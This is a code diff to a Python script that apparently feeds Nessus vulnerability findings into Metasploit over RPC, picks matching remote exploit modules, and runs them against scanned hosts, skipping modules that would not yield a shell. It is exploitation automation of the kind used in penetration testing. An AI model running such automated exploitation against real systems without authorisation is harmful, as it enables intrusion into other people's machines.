@@ -102,7 +102,6 @@ def get_exploit_data(host, vuln_info, severity, operating_sys):
         port = vuln_info['port']
         msf_mod = vuln_info['metasploit_name']
         exploit_data = (msf_mod, ip, port, operating_sys)
-        print('[+] Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))
 
         return exploit_data
 
@@ -158,12 +157,15 @@ def run_nessus_exploits(client, c_id, nes_exploits):
         path = get_msf_path(msf_exploits, mod_desc, os_type)
         if not path:
             continue
+        print('[+] Found vulnerable host! {}:{} - {}'.format(ip, port, path))####
 
         module_output = run_msf_module(client, c_id, local_ip, ip, path, port, os_type)
-        print('[*] {} output:'.format(path))
-        for l in module_output:
-            print('    '+l)
-        print('')
+
+        if module_output:
+            print('[*] {} output:'.format(path))
+            for l in module_output:
+                print('    '+l)
+            print('')
 
 def get_iface():
     '''
@@ -247,14 +249,16 @@ def get_msf_path(msf_exploits, mod_desc, os_type):
             rank = x_split[2]
             msf_desc = x_split[3]
             if mod_desc.lower() in msf_desc.lower():
-                if 'exploit/'+os_type in path or 'exploit/multi' in path:
-                    return path
+                if 'exploit/' in path:
+                    if '/local/' not in path and '/fileformat/' not in path:
+                        return path
 
 
 def run_msf_module(client, c_id, local_ip, ip, mod_path, port, os_type):
     '''
     Run a Metasploit module
     '''
+    rhost_var = None
     req_opts = get_req_opts(client, c_id, mod_path)
 
     # Sometimes it's RHOSTS sometimes its RHOST
@@ -263,6 +267,10 @@ def run_msf_module(client, c_id, local_ip, ip, mod_path, port, os_type):
             rhost_var = o
         else:
             rhost_var = 'RHOSTS'
+
+    if not rhost_var:
+        print('[-] No RHOST required option for this module meaning it won\'t give us a shell - skipping')
+        return
 
     target_num = get_target(client, c_id, mod_path, os_type)
     payload = get_payload(client, mod_path, os_type, target_num)
@@ -455,7 +463,6 @@ def main():
     client = get_msfrpc_client()
     console_id = get_console_id(client)
     run_nessus_exploits(client, console_id, nes_exploits)
-    embed()
 
 if __name__ == '__main__':
     args = parse_args() # This makes the 'args' variable global
